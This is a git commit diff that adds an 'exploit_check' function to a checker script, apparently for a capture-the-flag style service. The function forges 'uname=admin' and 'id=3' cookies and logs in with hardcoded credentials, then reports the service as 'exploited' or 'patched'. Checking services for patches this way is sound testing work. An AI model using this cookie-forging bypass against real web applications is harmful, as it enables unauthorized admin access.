b2e0c1d9ceeaadffd18ca68f9743eb9a988ec0c4
BluberryPickle <milinddinesh@gmail.com>
2022-01-27 23:45:49 +0530

    added exploit_check

--- md/checker.py
+++ md/checker.py
@@ -23,3 +23,23 @@ def health_check(url) -> bool :
             return True 
         else : return False
     else : return False
+
+def exploit_check(url):
+    if health_check(url):
+        client=requests.session()
+        client.get(url)
+        if 'csrftoken' in client.cookies:
+            csrftoken=client.cookies['csrftoken']
+        else:
+            csrftoken=client.cookies['csrf']
+        client.cookies['uname']='admin'
+        client.cookies['id']='3'        
+        login_data = dict(username='johndoe', password='jojo_123', csrfmiddlewaretoken=csrftoken, next='/reset')
+        r=client.post(url, data=login_data, headers=dict(Referer=url))
+        if r.status_code == 200 :
+            return True
+        else : return False
+
+if exploit_check(URL):
+    print("exploited")
+else : print('patched')
